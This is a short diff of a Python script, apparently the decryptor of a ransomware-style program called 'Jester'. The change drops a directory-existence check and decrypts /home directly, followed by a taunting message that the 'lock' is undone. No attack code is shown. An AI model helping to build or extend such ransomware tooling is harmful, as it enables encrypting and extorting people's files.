@@ -94,11 +94,7 @@ def main():
         print(f"[-] {e}")
         return
     user_directory = f"/home"
-    if os.path.exists(user_directory):
-        print(f"[*] Jester is colecting all the files for this user: {user}")
-        decrypt_directory(user_directory, key)
-    else:
-        print(f"[-] User directory for {user} does not exist or is inaccessible. Please don't make Jester dumb.")
+    decrypt_directory(user_directory, key)
     os.system('clear')
     print(banner)
     print("[+] Here you are! The trick has been played, and Jester has successfully undone the lock! Your files are free once more, restored to their rightful state. Consider this a lesson in the art of jest. A reminder, perhaps, that not all things are as serious as they seem! Thanksss for the entertainment. Jester takes a bow and bids you farewell... for now!")
